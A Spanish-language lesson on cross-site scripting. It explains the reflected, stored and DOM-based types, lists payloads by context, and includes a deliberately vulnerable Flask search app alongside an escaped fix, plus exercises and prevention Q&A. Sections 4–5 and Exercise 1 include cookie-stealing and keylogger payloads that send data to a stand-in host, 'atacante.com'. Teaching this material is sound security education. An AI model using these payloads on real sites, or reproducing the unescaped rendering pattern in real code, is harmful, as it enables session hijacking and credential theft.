# Clase 22: Cross-Site Scripting (XSS) - Teoria

**Duracion:** 2 horas

---

## Objetivos de Aprendizaje

1. Comprender que es XSS, como funciona y cual es su impacto
2. Diferenciar los 3 tipos de XSS: Reflejado, Almacenado y DOM-based
3. Conocer payloads comunes y en que contextos se ejecutan
4. Identificar vulnerabilidades XSS en codigo fuente y en aplicaciones web

---

## Contenido Detallado

### 1. Que es XSS?

Cross-Site Scripting (XSS) es un tipo de vulnerabilidad de inyeccion que permite a un atacante inyectar scripts maliciosos en paginas web vistas por otros usuarios. El navegador de la victima ejecuta el script porque confia en el origen del contenido.

**Como funciona:**

```
1. Atacante encuentra un input que no sanitiza correctamente
2. Atacante inyecta <script>alert('XSS')</script>
3. Usuario visita la pagina con el script inyectado
4. El navegador ejecuta el script en el contexto de la pagina
5. El atacante roba cookies, redirige, modifica la pagina, etc.
```

**Impacto de XSS:**

| Impacto | Descripcion |
|---------|-------------|
| Robo de cookies | `document.cookie` enviado a servidor del atacante |
| Robo de tokens | Acceso a localStorage, sessionStorage |
| Keylogging | Capturar teclas presionadas por el usuario |
| Defacement | Modificar visualmente la pagina |
| Phishing | Mostrar formularios falsos de login |
| Acceso a camara/mic | Abusar de permisos del navegador |
| Drive-by download | Forzar descarga de malware |
| Secuestro de sesion | Usar la sesion de la victima para acciones maliciosas |

### 2. Tipos de XSS

#### XSS Reflejado (Reflected XSS)

El script malicioso se refleja en la respuesta del servidor. No se almacena, solo se ejecuta cuando la victima visita una URL especialmente disenada.

**Flujo:**
```
1. Atacante crea URL maliciosa: sitio.com/buscar?q=<script>...
2. Atacante envia URL a la victima (email, phishing, red social)
3. Victima hace click en la URL
4. El servidor refleja el script en la respuesta
5. El navegador de la victima ejecuta el script
```

**Ejemplo:**

```html
<!-- Buscador vulnerable -->
<form action="/buscar" method="GET">
    <input type="text" name="q" value="<!-- AQUI SE REFLEJA EL INPUT -->">
    <input type="submit" value="Buscar">
</form>
<p>Resultados para: <!-- AQUI SE REFLEJA EL INPUT SIN SANITIZAR --></p>
```

**URL de ataque:** `http://sitio.com/buscar?q=<script>alert(document.cookie)</script>`

#### XSS Almacenado (Stored XSS)

El script malicioso se almacena en el servidor (base de datos, archivos, foro, comentarios) y se ejecuta cada vez que un usuario visita la pagina infectada.

**Flujo:**
```
1. Atacante publica un comentario con <script>malicioso</script>
2. El servidor almacena el comentario en la BD sin sanitizar
3. Cada usuario que visita la pagina del comentario ejecuta el script
4. El atacante recolecta cookies de multiples victimas
```

**Ejemplo:**
```html
<!-- Foro con comentarios -->
<form action="/comentar" method="POST">
    <textarea name="comentario"></textarea>
    <input type="submit">
</form>
<div class="comentarios">
    <!-- Comentarios de usuarios renderizados sin escape -->
</div>
```

**Payload:** El atacante escribe en el comentario:
```html
<script>
fetch('https://atacante.com/steal?cookie=' + document.cookie);
</script>
```

#### XSS DOM-based

La vulnerabilidad existe en el codigo JavaScript del lado del cliente, no en el servidor. El script malicioso se inyecta a traves de fuentes del DOM (URL, fragmento, localStorage) y se ejecuta en el cliente sin que el servidor intervenga.

**Flujo:**
```
1. Pagina carga JavaScript que lee window.location.hash o document.URL
2. El JS inserta ese valor directamente en el DOM (innerHTML, document.write)
3. Atacante envia URL con #<script>malicioso</script>
4. El JS del cliente ejecuta el script sin que el servidor se entere
```

**Ejemplo vulnerable:**
```javascript
// Codigo JS que lee el hash de la URL y lo inserta en el DOM
var user = window.location.hash.substring(1);
document.getElementById('saludo').innerHTML = 'Hola, ' + user;
```

**URL de ataque:** `http://sitio.com/pagina.html#<img src=x onerror=alert(1)>`

### 3. Diferencias entre los 3 tipos

| Caracteristica | Reflejado | Almacenado | DOM-based |
|---------------|-----------|------------|-----------|
| Almacenamiento | No (solo en URL/respuesta) | Si (BD, archivos) | No (solo en cliente) |
| Quien lo ejecuta | Servidor + Cliente | Servidor + Cliente | Solo Cliente |
| Persistencia | Un solo uso | Persistente (todos los usuarios) | Un solo uso |
| Medio de entrega | URL, phishing | Foros, comentarios, perfiles | URL, fragmento |
| Difícil de detectar | Media | Facil | Dificil (codigo JS) |

### 4. Payloads Comunes por Contexto

#### Contexto HTML (entre tags)

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<a href="javascript:alert('XSS')">Click</a>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<input type="text" value="" onfocus="alert('XSS')" autofocus>
<details open ontoggle="alert('XSS')">
```

#### Contexto de Atributo HTML

```html
<!-- Input: " onfocus="alert(1)" autofocus -->
<input value="INPUT">
<!-- Resultado: -->
<input value="" onfocus="alert(1)" autofocus="">

<!-- Input: "><script>alert(1)</script> -->
<div class="INPUT">
<!-- Resultado: -->
<div class=""><script>alert(1)</script>">
```

#### Contexto de JavaScript

```javascript
// Input: "; alert(1); var x="
var user = "INPUT";
// Resultado:
var user = ""; alert(1); var x="";

// Input: </script><script>alert(1)</script>
<script>var x = "INPUT";</script>
```

#### Contexto de CSS

```html
<style>
body { background: url("javascript:alert('XSS')"); }
</style>
<style>
body { color: INPUT }
<!-- Input: red; background-image: url(javascript:alert('XSS')); -->
</style>
```

#### Contexto de URL

```html
<a href="INPUT">Click</a>
<!-- Input: javascript:alert('XSS') -->
<!-- Input: %6A%61%76%61%73%63%72%69%70%74:alert(1) (encoding) -->
```

### 5. Payloads para Robo de Cookies

```javascript
// Payload basico para robar cookies
<script>
document.location='https://atacante.com/steal?c='+document.cookie
</script>

// Usando fetch
<script>
fetch('https://atacante.com/steal?c='+encodeURIComponent(document.cookie))
</script>

// Usando Image
<script>
new Image().src='https://atacante.com/steal?c='+document.cookie;
</script>

// Keylogger
<script>
document.onkeypress = function(e) {
    fetch('https://atacante.com/key?k=' + e.key);
};
</script>
```

### 6. XSS en Diferentes Frameworks

#### React (sin proteccion)

```jsx
// PELIGROSO: dangerouslySetInnerHTML
function UserInput({ input }) {
    return <div dangerouslySetInnerHTML={{ __html: input }} />;
}

// SEGURO: React escapa por defecto
function SafeInput({ input }) {
    return <div>{input}</div>;  // input se escapa automaticamente
}
```

#### Jinja2 / Flask

```html
<!-- PELIGROSO: |safe desactiva el escape -->
<p>{{ input|safe }}</p>

<!-- SEGURO: escape por defecto -->
<p>{{ input }}</p>
```

#### Angular

```html
<!-- PELIGROSO: bypassSecurityTrustHtml -->
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(input)"></div>

<!-- SEGURO: interpolacion por defecto -->
<div>{{ input }}</div>
```

---

## Ejercicio 1: Aplicacion Flask con XSS Reflejado

### Escenario

Aplicacion de busqueda vulnerable a XSS reflejado. Debes demostrar el ataque y luego corregirla sanitizando el input.

**Paso 1: Aplicacion vulnerable**

```python
"""
app_xss_vulnerable.py - App con XSS reflejado
"""
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/buscar')
def buscar():
    query = request.args.get('q', '')

    # VULNERABLE: Renderiza el input sin escapar
    template = """
    <!DOCTYPE html>
    <html>
    <head><title>Buscador</title></head>
    <body>
        <h1>Buscador</h1>
        <form method="GET">
            <input type="text" name="q" value="%s">
            <input type="submit" value="Buscar">
        </form>
        <p>Resultados para: %s</p>
    </body>
    </html>
    """ % (query, query)

    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

**Paso 2: Demostrar el ataque**

Abrir en el navegador:
```
http://127.0.0.1:5000/buscar?q=<script>alert(document.cookie)</script>
```

**Paso 3: Demostrar robo de cookies**

```html
<!-- Atacante prepara esta URL y se la envia a la victima -->
http://127.0.0.1:5000/buscar?q=<script>fetch('https://atacante.com/steal%3Fc%3D'%2Bdocument.cookie)</script>
```

**Paso 4: Version corregida con escape**

```python
"""
app_xss_segura.py - Version con sanitizacion
"""
from flask import Flask, request, render_template_string
from html import escape

app = Flask(__name__)

@app.route('/buscar')
def buscar():
    query = request.args.get('q', '')

    # CORREGIDO: Escapar el input antes de renderizar
    safe_query = escape(query)

    template = """
    <!DOCTYPE html>
    <html>
    <head><title>Buscador</title></head>
    <body>
        <h1>Buscador</h1>
        <form method="GET">
            <input type="text" name="q" value="{{ query }}">
            <input type="submit" value="Buscar">
        </form>
        <p>Resultados para: {{ query }}</p>
    </body>
    </html>
    """

    # Usar render_template_string con variables (escape automatico de Jinja2)
    return render_template_string(template, query=safe_query)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

**Explicacion:** `html.escape()` convierte caracteres peligrosos:
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#x27;`
- `&` → `&amp;`

Esto impide que el navegador interprete el input como codigo HTML/JavaScript.

---

## Ejercicio 2: Identificar y Clasificar Tipos de XSS

### Escenario

Analizar 5 fragmentos de codigo, determinar si son vulnerables a XSS, clasificar el tipo, y explicar como explotarlos.

**Caso A:**
```python
# Aplicacion Flask
@app.route('/perfil/<username>')
def perfil(username):
    return f"<h1>Perfil de {username}</h1><p>Bienvenido a tu perfil</p>"
```

**Caso B:**
```javascript
// Codigo JavaScript en pagina HTML
var params = new URLSearchParams(window.location.search);
var nombre = params.get('nombre');
document.getElementById('mensaje').innerHTML = 'Hola ' + nombre;
```

**Caso C:**
```python
# Foro con comentarios (usando BD)
@app.route('/comentar', methods=['POST'])
def comentar():
    comentario = request.form['comentario']
    db.execute("INSERT INTO comentarios (texto) VALUES (?)", (comentario,))
    # ...
    return "Comentario publicado"

@app.route('/foro')
def ver_comentarios():
    comentarios = db.execute("SELECT texto FROM comentarios").fetchall()
    html = "<h1>Comentarios</h1><ul>"
    for c in comentarios:
        html += f"<li>{c['texto']}</li>"
    html += "</ul>"
    return html
```

**Caso D:**
```javascript
// Pagina web
var hash = window.location.hash.substring(1);
document.write('Pagina: ' + hash);
```

**Caso E:**
```html
<!-- Plantilla Jinja2 con autoescape desactivado -->
{% autoescape false %}
<div class="resultado">
    {{ busqueda }}
</div>
{% endautoescape %}
```

### Solucion

| Caso | Tipo | Explicacion | Como explotar |
|------|------|-------------|---------------|
| **A** | Reflejado | El servidor refleja `username` directamente en HTML sin escape | URL: `/perfil/<script>alert(1)</script>` |
| **B** | DOM-based | El JS lee de `location.search` (fuente) y escribe con `innerHTML` (sumidero) | URL: `?nombre=<img src=x onerror=alert(1)>` |
| **C** | Almacenado | El comentario se almacena en BD y luego se renderiza sin escape en el foro | Publicar comentario con `<script>alert(1)</script>`, cada visitante lo ejecuta |
| **D** | DOM-based | Lee de `location.hash` y escribe con `document.write` (sumidero peligroso) | URL: `pagina.html#<script>alert(1)</script>` |
| **E** | Reflejado/Almacenado | Jinja2 tiene autoescape desactivado, el valor se renderiza como HTML | Depende de como se reciba `busqueda`, puede ser reflejado o almacenado |

---

## Ejercicio 3: Payloads XSS por Contexto

Completar la siguiente tabla con el payload correcto para cada contexto:

| Contexto | Codigo vulnerable | Payload |
|----------|------------------|---------|
| Entre tags HTML | `<div>INPUT</div>` | |
| Atributo HTML | `<input value="INPUT">` | |
| JavaScript string | `<script>var x = 'INPUT';</script>` | |
| Event handler | `<div onmouseover="INPUT">` | |
| URL en atributo | `<a href="INPUT">Link</a>` | |
| CSS | `<style>body { color: INPUT }</style>` | |

**Solucion:**

| Contexto | Payload |
|----------|---------|
| Entre tags HTML | `<script>alert(1)</script>` o `<img src=x onerror=alert(1)>` |
| Atributo HTML | `" onfocus="alert(1)" autofocus` o `" onmouseover="alert(1)` |
| JavaScript string | `'; alert(1); var x='` o `</script><script>alert(1)</script>` |
| Event handler | `alert(1)` o `alert(1)//` (no necesita tags) |
| URL en atributo | `javascript:alert(1)` |
| CSS | `red; background-image: url(javascript:alert(1)); x: ` |

---

## Preguntas y Respuestas

### Pregunta 1
**Cual es la diferencia fundamental entre XSS Reflejado y XSS Almacenado?**

**Respuesta:** En XSS Reflejado, el payload no se almacena en el servidor; se refleja inmediatamente en la respuesta HTTP. La victima debe hacer click en una URL especialmente disenada. En XSS Almacenado, el payload se persiste en el servidor (base de datos, archivos, sistema de archivos) y se ejecuta cada vez que cualquier usuario visita la pagina infectada, sin necesidad de hacer click en una URL especial. El almacenado es mas peligroso porque afecta a multiples usuarios sin interaccion adicional.

### Pregunta 2
**Que es XSS DOM-based y en que se diferencia de los otros tipos?**

**Respuesta:** XSS DOM-based ocurre completamente en el lado del cliente. El servidor no es parte del ataque; la vulnerabilidad existe en el codigo JavaScript que lee datos de fuentes del DOM (URL, `location.hash`, `document.referrer`, `localStorage`, `postMessage`) y los escribe en sumideros peligrosos (`innerHTML`, `document.write`, `eval`, `setTimeout` con strings). A diferencia de XSS Reflejado y Almacenado, el servidor nunca ve el payload porque se ejecuta completamente en el cliente. Esto lo hace dificil de detectar con scanners tradicionales (que solo analizan respuestas del servidor).

### Pregunta 3
**Cuales son los contextos mas comunes donde ocurre XSS y como se ataca cada uno?**

**Respuesta:** Los contextos mas comunes son: (1) **Entre tags HTML**: cerrar el contexto actual e insertar un nuevo tag `<script>`. (2) **Dentro de un atributo HTML**: escapar del valor del atributo con `" onfocus=alert(1) autofocus`. (3) **Dentro de un string JavaScript**: romper el string con `'; alert(1); var x='`. (4) **En un event handler**: insertar codigo JS directamente sin necesidad de tags HTML completos. (5) **En una URL**: usar `javascript:alert(1)` como protocolo. (6) **En CSS**: usar `background-image: url(javascript:...)` o expression() en IE antiguo.

### Pregunta 4
**Por que innerHTML es peligroso y cual es la alternativa segura?**

**Respuesta:** `innerHTML` es peligroso porque el navegador parsea el string como HTML, ejecutando cualquier tag `<script>` o atributo `onerror`/`onload` que contenga. Incluso si solo quieres insertar texto, `innerHTML` lo interpreta como markup. La alternativa segura es `textContent` (o `innerText`), que trata el valor como texto plano y escapa cualquier caracter HTML automaticamente. Para insertar HTML de forma segura, usar `document.createElement()` y `document.createTextNode()` en lugar de concatenar strings.

### Pregunta 5
**Es posible tener XSS en APIs REST que solo devuelven JSON?**

**Respuesta:** Si, aunque menos comun. Si la API devuelve JSON con `Content-Type: application/json`, el navegador no ejecutara scripts. El riesgo ocurre si: (1) la respuesta JSON se refleja en una pagina HTML (XSS Reflejado via JSONP), (2) el `Content-Type` esta mal configurado (ej: `text/html` en vez de `application/json`), (3) hay vulnerabilidades de inyeccion en el propio codigo JS que procesa la respuesta JSON (ej: `eval()` sobre la respuesta), (4) hay ataques de JSON hijacking (versiones antiguas de navegadores). Las APIs deben siempre configurar `Content-Type: application/json` y escapar cualquier dato que se refleje en respuestas de error.

### Pregunta 6
**Como se puede prevenir XSS en el contexto de una SPA (Single Page Application) moderna?**

**Respuesta:** En SPAs modernas (React, Angular, Vue), la prevencion se basa en: (1) usar el escape automatico que proporciona el framework (React escapa en JSX, Angular con interpolacion `{{ }}`), (2) evitar metodos peligrosos como `dangerouslySetInnerHTML` (React), `bypassSecurityTrustHtml` (Angular), `v-html` (Vue), (3) no usar `eval()`, `new Function()`, `setTimeout(string)` que ejecutan codigo arbitrario, (4) sanitizar cualquier HTML que deba renderizarse (usando DOMPurify, bleach), (5) implementar CSP estricto (nonce-based), (6) validar y sanitizar datos en el servidor antes de enviarlos al cliente.

---

## Tarea / Lectura Recomendada

1. **Leer:** OWASP XSS Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
2. **Leer:** OWASP DOM-based XSS Prevention - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
3. **Practicar:** PortSwigger XSS Labs - https://portswigger.net/web-security/cross-site-scripting
4. **Experimentar:** Configurar la app Flask vulnerable, probar distintos payloads XSS
5. **Leer:** "XSS Game" de Google - https://xss-game.appspot.com/ (ejercicios interactivos)
6. **Profundizar:** Investigar mutation XSS (mXSS) y XSS en contextos de service workers


